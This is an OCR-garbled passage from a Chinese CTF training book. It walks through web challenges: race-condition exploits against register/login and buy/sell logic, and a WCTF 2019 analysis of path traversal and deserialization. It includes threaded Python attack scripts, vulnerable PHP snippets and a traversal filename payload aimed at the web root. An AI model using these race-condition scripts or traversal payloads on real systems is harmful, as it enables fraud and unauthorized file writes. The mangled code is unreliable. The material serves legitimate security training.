$row=Sresult->fetch_assoc();
var_dump(S_POST);
var_dump($row);
if(S_POST[username]===$row[username]and S_POST[password]===$row
password
?>
Logged in as 
fetch_assoc();
if($rowisRestricted)
?>
此账户限制登录
成功1
账户
用户名
---
## Page 187
CTF特训营：技术详解、解题方法与
8.2湖湘杯2016线上选拔赛Web实例
187/1144
密码
分析login.php的代码可以了解到，只要满足Srow[isRestricted]不
为真或没有返回值（即查询为空），就能获取到flag。再来看看
register.php的关键部分：
Ssql =“INSERT into users(username,password) values($usermame',$password);”;
mysqli_query(Sconn,$sql);
Ssql=INSERTinto privs(userid，isRestricted）values(select users.id fromusers
whereusername=Susername),TRUE);";
mysqli_query($conn, $sql);
注册时的逻辑是先向users表中插入用户和密码，再向privs表中
插入权限信息，所以两次数据库操作存在时间差。当我们在插入用户
密码，但是还没有插入权限信息时登录，就能够获得flag了。
---
## Page 188
CTF特训营：技术详解、解题方法与
8.2湖湘杯2016线上选拔赛Web实例
188/1144
所以，同样的测试代码如下：
#题目与代码来源：https://github.com/iAklis/changelog-story
import requests
import string
import re
import random
import threading
uri_register="http://127.0.0.1:8000/register.php"
url_login="http://127.0.0.1:8000/login.php
def register(data):
requests.post(url_register,data=data)
def login(data):
S=requests.Session()
R=S.post（url_login,data=data)
content=R.content
if flag’ in content:
print content
def main():
while True:
username =test+*.join(random.choice(string.asci_letters) foriin range(5))
password=‘123
data={username':usermame,password’:password}
t1=threading.Thread（target=register,args=(data,))
t2=threading.Thread（target=login,args=(data,)
t1.start()
t2.start()
t1.join()
t2.join()
ifname
uew，==
import sys
sys.exit（int（main()or 0))
最后附上数据库的结构，以便大家自已测试：
CREATEdatabaseif notexistsaart;
---
## Page 189
CTF特训营：技术详解、解题方法与
8.2湖湘杯2016线上选拔赛Web实例
189/1144
USEaart;
DROP TABLE art;
CREATE TABLE art
idINTPRIMARYKEYAUTOINCREMENT
title TEXT,
art TEXT,
userid INT,
karma INT DEFAULT 0
DROP TABLEusers;
)
CREATE TABLEusers
idINTPRIMARYKEYAUTOINCREMENT,
username TEXT
password TEXT
DROP TABLEprivs;
CREATETABLE privs
useridINTPRIMARYKEY
isRestrictedBOOL
---
## Page 190
CTF特训营：技术详解、解题方法与
8.30CTF2017Web实例
190/1144
8.30CTF2017Web实例
这道题与上一道题是类似的，这里简单介绍下题目内容：注册登
录之后，我们账户里面一共有4000元，但是要获得hint需要8000元。
页面给出了如图8-2所示的功能。
Prier
400
1600
HNT
3000
Bacswor
2800
Browrie
2200
See Orsan
000
图8-2题目界面
如图8-2所示，我们可以买入一个东西，也可以将其卖出，逻辑
很清晰。根据猜测以及前文中的分析，我们可以得知在卖出的时候
服务端先更新账户余额，再扣除货物，所以可以利用两次数据库操作
的时间差来触发条件竞争漏洞，测试代码如下：
importsys
importrequests
import threading
---
## Page 191
CTF特训营：技术详解、解题方法与
8.30CTF2017Web实例
191/1144
url1 = http://202.120.7.197/app.php
def get(url):
try:
result=requests.get（url,headers=Cookie":"PHPSESSID=
s19hq4hahl2fdoomact47vpq75"))
except:
pass
def main():
while True:
t1 = threading.Thread(target=get,args=（url1+"?action=buy&id=5",))
t2= threading.Thread(target=get,args=（url1+"?action=sale&id=5",))
t3= threading.Thread（target=get,args=（url1+"?action=sale&id=5",)
t1.start()
t2.start()
t3.start()
if_name..
=='main_
sys.exit（int（main()or0))
通过上述代码即可触发条件竞争漏洞从而获得金钱。最后给出部
分源码，以帮助分析，处理卖出请求的源码如下：
query($sql);
Stmp=Sresult->fetch_array(MYSQLI_ASSOC);
if(!$tmp){
errormsg("You dont have this goods");
Ssql =“select price,info,name from goods where id =$goodsid";
/查询产品的价格
Sresult = $con->query($sql);
Sgoods=Sresult->fetch_array(MYSQLI_ASSOC);
Sprice=Sgoods[price];
---
## Page 192
CTF特训营：技术详解、解题方法与
8.30CTF2017Web实例
192/1144
Swallet =$user[wallet];
Swallet+=Sprice;//$Swallet即账户余额
$sql =“updateuserset wallet =$wallet where id=Suserid”;
/卖出的时候先更新账户余额
if($con->query($sql)!==true){
errormsg("Update fail");
Ssql="delete fromusergoodswhere goodsid= Sgoodsid and userid=Suserid limit 1
；/更新完账户余额后再扣除货物
if($con->query($sql)I==true)
errormsg("Sale fail");
msg(
"status"=>"suc",
"wallet”=>Swallet,
1
）
---
## Page 193
CTF特训营：技术详解、解题方法与
8.42019WCTF大师赛赛题剖析：P-door
193/1144
8.42019WCTF大师赛赛题剖析：P-door
这道题用到了前文所述的代码审计、反序列化漏洞等技术，该题
目已经开源，获取地址为https://github.com/paul-axe/ctf。拿到题目后，
可以发现其具有以下几个功能：注册、登录、写文章（如图8-3所
示)。
User:testsky
test
test
CreatedbySuperBlogSystem
Renderedat:1562656583.9231
Back
Pubish
---
## Page 194
CTF特训营：技术详解、解题方法与
8.42019WCTF大师赛赛题剖析：P-door
194/1144
图8-3题目界面
注意，Cookie中存在反序列化字符串形式的值，如图8-4所示。
192.168.1.106|draft
值
O%3A4%3A%22Page%22%3A6%3A%7Bs%3A4%3A%22view%22%3BN%
3Bs%3A4%3A%22text%22%3Bs%3A4%3A%22test%22%3Bs%3A8%3A%
22template%22%3Bs%3A4%3A%22main%22%3Bs%3A6%3A%22header
%22%3BO%3A4%3A%22Page%22%3A6%3A%7Bs%3A4%3A%22view%2
2%3BN%3Bs%3A4%3A%22text%22%3Bs%3A4%3A%22test%22%3Bs%3
域名
192.168.1.106
192.168.1.106|user
值
域名
图8-4发现反序列化字符串
所以猜测这道题可能需要获得源码并进行审计，扫描后发现存在
Git泄露源码的问题
分析代码时可以发现，代码量非常少，但挑战不小。我们关注到
该题主要有3个大类，分别是：User、Cache、Page，并且在代码中
使用了Redis作为数据库，代码如下：
Sredis = new Redis();
---
## Page 195
CTF特训营：技术详解、解题方法与
8.42019WCTF大师赛赛题剖析：P-door
195/1144
Sredis->connect（"db",6379)ordie("Cant connect to database")
所以猜测题目不是要Getshel就是SSRF，flag很有可能在Redis数
据库服务器中。如果要进行Getshell，或许可以利用“写文章”的功
能，那么审计的重点就会集中到写文件部分。在大概了解了代码结构
之后，首先我们关注一下Page类里的publish方法，代码如下：
publicfunction publish(Sfilename){
$user=User:getlnstance();
$ext = substr(strstr($filename,"),1);
$path=Suser->getCacheDir()."/".microtime(true)."".$ext;
$user->checkWritePermissions();
Cache:writeToFile($path,$this);
可以看到，在路径的结尾，文件名的后缀会取第一个“点”后面
的部分，构造出路径穿越，例如：
Sfilename =./.././.../var/ww/html/sky.php:
我们可以利用这一点进行任意目录写。
下面再来跟进一下传参方式，首先看一下index.php，代码片段
如下：
---
## Page 196
CTF特训营：技术详解、解题方法与
8.42019WCTF大师赛赛题剖析：P-door
196/1144
Scontroller=newMainController();
Smethod ="do".S_GET[m"];
if（method_exists($controller,$method))
$controller->$method();
}else{
$controller->dolndex()
}
从这段代码中可以发现，我们可以触发以“do”开头的方法
接下来查看调用publish的相关方法，代码如下：
publicfunction doPublish(
$this->checkAuth();
$fname=S_POST[fname"];
$page->publish($fname);
setcookie("draft", null, -1);
die("Your blog post will be published after a while (never)Back")
可以看到，doPublish方法体第4行的Spage会调用publish方法
该方法的参数使用了POST的fname参数。那么我们可以构造fname参
数为：
./...../var/ww/html/sky.php
继续往下，可以看到“CachewriteToFile（Spath，Sthis）："，从方法
---
## Page 197
CTF特训营：技术详解、解题方法与
8.42019WCTF大师赛赛题剖析：P-door
197/1144
名可以判断出这是一个写文件操作，下面继续跟进writeToFile方法
代码如下：
classCache
public static function writeToFile($path,$content){
$info=pathinfo($path);
if （lis_dir(Sinfo["dirname"]))
thrownewException("Directory doesn'texists")
if (is_file(Spath))
throw new Exception("File already exists");
file_put_contents(Spath,$content);
可以看出，writeFile方法在写文件之前会先判断目录是否存在
若不存在则抛出异常，而我们的路径为：
Spath=$user->getCacheDir()."/".microtime(true)."".$ext;
显然，microtime（true）目录是不存在的，所以我们继续跟进参与
到路径变量拼接中的getCacheDir方法，代码如下：
publicfunction getCacheDir():string{
$dir_path=self:CACHE_PATH.$this->name;
if (lis_dir(Sdir_path))
mkdir($dir_path);
return $dir_path;
---
## Page 198
CTF特训营：技术详解、解题方法与
B.42019WCTF大师赛赛题剖析：P-door
198/1144
我们发现其中调用了mkdir方法来创建目录，并且这一步是在校
验写权限方法“Suser->checkWritePermissions()：”之前。因此，如果
我们可以控制：
Sdir_path = self:CACHE_PATH. Sthis->name
就可以创建任意目录。但还有一个microtime（true）目录是无法控
制的，所以接下来需要我们对要创建的microtime（true）目录名进行预
估，如图8-5所示。
php>echotimeO."&&".microtime(true)；
1563883585&&1563883585.2312
php>echotimeO）."&&".microtime(true);
1563883587&&1563883587.2366
php>echotimeO."&&".microtime(true)；
1563883587&&1563883587.7789
php>echotimeO."&&".microtime(true);
1563883588&&1563883588.2679